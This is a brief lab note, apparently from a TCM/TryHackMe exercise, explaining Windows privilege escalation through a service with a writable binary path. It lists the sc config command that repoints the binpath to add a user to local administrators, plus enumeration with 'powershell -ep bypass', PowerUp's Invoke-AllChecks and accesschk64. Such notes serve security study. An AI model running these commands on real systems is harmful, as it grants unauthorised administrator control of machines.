Follow the TCM THM Box

Basically, its exploiting a service inside of the windows machine and doing it in such a way that you end up being the administrator of the machine. This method involves you to check which service has a read and write permission to its binary path and then change that binary path to:

```powershell
sc config <name of service> binpath = "net localgroup administrators user/add"
```

To check whether the machine has this or not, you can run the following commands:

```powershell
powershell -ep bypass
.\PowerUp.ps1
Invoke-AllChecks
```

While that is running, you can use this:

```powershell
cd Desktop\Tools\Accesschk
accesschk64.exe -uwcv Everyone *
```

Once you find the service that can be exploited, you can use accesschk64.exe on the service itself using the same parameters. And that will give you more information.

